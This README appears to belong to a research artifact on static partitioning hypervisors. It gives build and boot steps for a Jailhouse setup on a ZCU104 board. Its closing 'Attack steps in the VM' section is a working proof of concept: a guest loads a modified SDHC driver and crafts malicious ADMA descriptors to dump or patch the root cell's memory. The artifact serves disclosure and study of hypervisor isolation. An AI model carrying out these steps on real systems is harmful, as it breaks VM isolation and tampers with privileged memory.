**This directory contains all necessary artifact and steps for building the test environment on Zynq UltraScale+ MPSoCs (ZCU104) platforms:**

- **jailhouse/**: Jailhouse build directory
- **root cell/**: Build directory of the Linux running  in the privileged VM (root cell) from which the hypervisor is controlled
- **inmate/**: Build directory of the LInux system running in a unprivileged VM (cell) from which the attack is achieved
- **configs/**: Contains all the configs (.cell) and device trees for running the VMs
- **patches/**: Contains necessary patches for running Jailhouse with a Linux Kernel v5.14

The installation steps for Jailhouse and the root cell are based on: https://gitlab.com/ESRGv3/shedding-light-static-partitioning-hypervisors/-/tree/master/jailhouse?ref_type=heads
NB: One USB key and SD card are required

**Host requirements for building**

Host machine tested: 
- Ubuntu 22.04.5 LTS (jammy jellyfish)
- Ubuntu 20.04.6 LTS (focal)

Mandatory packages for the Linux Kernel: 
- make build-essential libncurses-dev bison flex libssl-dev libelf-dev
Mandatory packages for Buildroot: 
- Please refer to: https://buildroot.org/downloads/manual/prerequisite.txt


Arm GNU Toolchain (AArch64 GNU/Linux target - aarch64-none-linux-gnu) is required to build Jailhouse
- It can be fund at: https://developer.arm.com/downloads/-/arm-gnu-toolchain-downloads	
- Version used: aarch64-none-linux-gnu-gcc (Arm GNU Toolchain 13.3.Rel1 (Build arm-13.24)) 13.3.1 20240614
- In the following steps: $PATH_TO_ARM_GNU_TOOLCHAIN refers to the path where the toolchain was installed

### Building the Root Cell

---
**Setup buildroot for building the root cell's rootfs:**

```bash
JH_WD=PATH_TO_THIS_DIR
git clone https://gitlab.com/ESRGv3/shedding-light-paper/jailhouse.git -b shedding-light
mkdir -p $JH_WD/jailhouse/install 
cd $JH_WD/rootcell
git clone https://github.com/buildroot/buildroot.git --depth 1 --branch 2024.11.1
cd buildroot
make qemu_aarch64_virt_defconfig
```

Then, set the following kconfig options (e.g. in the `make menuconfig` menu):

- BR2_LINUX_KERNEL=n

- BR2_TARGET_GENERIC_GETTY_PORT=console

- BR2_SYSTEM_DHCP=

- BR2_TARGET_ROOTFS_EXT2=n

- BR2_TARGET_ROOTFS_TAR=y

- BR2_TOOLCHAIN_BUILDROOT_GLIBC=y

- BR2_PACKAGE_PYTHON3=y

- BR2_PACKAGE_PYTHON3_ZLIB=y

- BR2_PACKAGE_HOST_QEMU=n

  *Jailhouse will produces tools and configs in $JH_WD/jailhouse/install, add this path as rootfs overlay so that it is directly added to the root cell's file system*

- BR2_ROOTFS_OVERLAY=$JH_WD/jailhouse/install

Building the root cell's file system:

```
make -j$(nproc)
```

**Build the root Linux Image:**

```bash
cd $JH_WD/rootcell
git clone https://github.com/torvalds/linux.git --depth 1 --branch v5.14
cd linux
git am $JH_WD/patches/0001-export-symbols-needed-by-jailhouse-s-module.patch
git am $JH_WD/patches/0001-add-boot-time-instrumentation.patch
#Cross compile the kernel with the toolchain generated by buildroot
export ARCH=arm64 CROSS_COMPILE=$JH_WD/rootcell/buildroot/output/host/bin/aarch64-buildroot-linux-gnu-
make defconfig
```

Then set the following kconfig options (e.g. in the `make menuconfig` menu):

- CONFIG_DRM=n

- CONFIG_NVMEM_ZYNQMP=y

  *The SMMU will be used at hypervisor level, no need to implement the driver at the kernel level*

- ARM_SMMU=n

- ARM_SMMU_V3=n

Building the root cell's Linux kernel image: `make -j$(nproc)`.



### Building Jailhouse

---

```bash
cp $JH_WD/configs/config.h $JH_WD/jailhouse/include/jailhouse
cd $JH_WD/jailhouse
#Copy the config files of the environement in Jailhouse build directory
cp -r $JH_WD/configs/* $JH_WD/jailhouse/configs/arm64/

#Compile Jailhouse with arm-gnu-toolchain and the kernel source directory obtained at the previous step
make ARCH=arm64 CROSS_COMPILE=$PATH_TO_ARM_GNU_TOOLCHAIN/bin/aarch64-none-linux-gnu- KDIR=$JH_WD/rootcell/linux/ DESTDIR=$JH_WD/jailhouse/install CONFIG_REPO=$JH_WD/jailhouse/configs install

#Copy all necessary tools and configs in $JH_WD/jailhouse/install/
mkdir -p $JH_WD/jailhouse/install/usr/share/jailhouse/tools/
cp -r $JH_WD/jailhouse/tools/* $JH_WD/jailhouse/install/usr/share/jailhouse/tools/
```



### Building the Linux inmate (device tree + image)

---

Both the file system and the Linux kernel image are generated with Buildroot:

```
cd $JH_WD/inmate
git clone https://github.com/buildroot/buildroot.git --depth 1 --branch 2024.11.1
cd buildroot
make zynqmp_zcu104_defconfig
```

Then, set the following config options (e.g. with `make menuconfig`):

- BR2_TARGET_ROOTFS_CPIO=y
- BR2_TARGET_ROOTFS_CPIO_FULL=y
- BR2_PACKAGE_PERL=y

**The SDHC driver must not be built-in, since we are going to use modified SDHC driver**

Thus, set the following kernel config options (e.g. with `make linux-menuconfig`):

- CONFIG_MMC_SDHCI=m
- CONFIG_MMC_SDHCI_PLTFM=m
- CONFIG_MMC_SDHCI_OF_ARASAN=m

Finally, build the root filesystem (cpio) and Linux image: `make -j$(nproc)`.

**Compile the modified SDHC driver and add the kernel module to the rootfs**

```bash
#Copy the modified driver to the Linux source directory
cp $JH_WD/../sdhci.c $JH_WD/inmate/buildroot/output/build/linux-custom/drivers/mmc/host/

#Rebuild the kernel to compile the modified SDHC driver as a kernel module and rebuild the root file system
make linux-rebuild
make
```



## Install


Rebuild the root cell rootfs so that the Jailhouse module installation is added to the rootfs.

```bash
cd $JH_WD/rootcell/buildroot
#The root cell's rootfs is regenerated with the tools and configs generated by jailhouse in $JH_WD/jailhouse/install
make -j12
cd $JH_WD/rootcell/buildroot/output/images

#Create a partition (ext4) on the USB for the root cell's rootfs, mount the partition ($USB_MNT/root) and untar the rootfs into it
tar xf rootfs.tar --directory=$USB_MNT/root

#Copy the hypervisor and VMs config files
cd $JH_WD/jailhouse/
cp configs/arm64/linux.cell $USB_MNT/root
cp configs/arm64/root.cell $USB_MNT/root
cp configs/arm64/dts/linux.dtb $USB_MNT/root

#Also copy the inmate's Image and rootfs (cpio)
cd $JH_WD/inmate/buildroot/output/images/Image $USB_MNT/root
cd $JH_WD/inmate/buildroot/output/images/rootfs.cpio $USB_MNT/root



#Create a boot partition (fat32) on the USB and copy the system's device tree and the root cell's Linux image
cp $JH_WD/rootcell/linux/arch/arm64/boot/Image $USB_MNT/boot/
cp $JH_WD/jailhouse/configs/arm64/dts/root-boot.dtb $USB_MNT/boot/
```

## Launch the root cell, the hypervisor and the VMs

Plug the USB key to the board (ZCU104), boot the latter and run the following U-boot commmands:

```bash
#The root cell's rootfs is on partition /dev/sda1 of the USB. The following command must be adapted according to the partition on which the root cell's rootfs is stored.
setenv bootargs clk_ignore_unused console="ttyPS0,115200" mem=512M root="/dev/sda1" rw rootwait; 
usb start;
#The device and part number must be adapted to match the boot partition on the USB
load usb 0:2 0x200000 Image;
load usb 0:2 0x1e0000 root-boot.dtb;
booti 0x200000 - 0x1e0000;
```

**In the root cell, launch Jailhouse and the malicious VM:**

```
insmod /lib/modules/5.14.0-00002-gfeb158eb42ad/extra/driver/jailhouse.ko
PATH=$PATH:/usr/share/jailhouse/tools/
jailhouse enable /root.cell
#Copy pyjailhouse to python 3.12 packages location
cp -r /usr/local/lib/python3.10/dist-packages/* /usr/lib/python3.12/site-packages/
jailhouse cell linux /linux.cell /Image -d /linux.dtb -i /rootfs.cpio -c "console=ttyPS0,115200 " 
jailhouse cell list
```
## Attack steps in the VM

----

```bash
#Insert the modified SDHC driver
insmod /lib/modules/6.6.40/kernel/drivers/mmc/host/sdhci.ko
insmod /lib/modules/6.6.40/kernel/drivers/mmc/host/sdhci-pltfm.ko
insmod /lib/modules/6.6.40/kernel/drivers/mmc/host/sdhci-of-arasan.ko

#Create a file that contains the target memory region in the root cell's memory to be dumped/patched
#Ex: \x23\x00\x22\x11\xdd\xcc\xbb\xaa to patch 0x1122 bytes at address 0xaabbccdd)
echo -n -e '\x23\x00\x16\x10\x00\x00\x21\x00'  > target

#Create a file that contains your payload (for patching the root cell's)
echo -n -e INSERT_YOUR_PAYLOAD_1234 > payload

#Request a descriptor table (of a size of 512 pages in that case) and print the physical address of the descriptor table
echo -n -e '512'  > /sys/devices/platform/ff170000.mmc/request_desc_table

#Prepare a partition on the SD card for the attack. /dev/mmcblk0p2 must be adapted to your case
#The address field of the descriptor (i.e., \x00\x00\xb0\x54 in the command below) must be replaced with the address given by request_desc_table. In that case the address given was 0x54b00000

perl -e    '$count=1024; while ($count>0) {
      syswrite(STDOUT, "\x25\x00\x08\x00\x00\x00\xb0\x54",  8);
      $count--;
    }' > /dev/mmcblk0p2

#Copy the malicious DMA instruction to SD card (seek=Number of loop on the descriptor table-1)
dd if=target of=/dev/mmcblk0p2 bs=8 seek=511 count=1 
#Copy the payload to SD card after the malicious buffer descriptor. (bs X count) must match the size of the payload. (seek) corresponds to the number of loop on the descriptor table. 
dd if=payload of=/dev/mmcblk0p2 bs=8 seek=512 count=1 

#Prepare the descriptor table in RAM for carrying out the attack
cat /sys/devices/platform/ff170000.mmc/enable_custom_adma
cat /sys/devices/platform/ff170000.mmc/construct_adma_attack

#Run the attack (if= for patching, of= for dumping RAM)
dd if=/dev/mmcblk0p2 bs=64k count=1M

#Then, the VM can be destroyed and the malicious DMA operation will be performed after some time depending on the chosen size of the descriptor table and the number of loop (seek) in the descriptor table
```

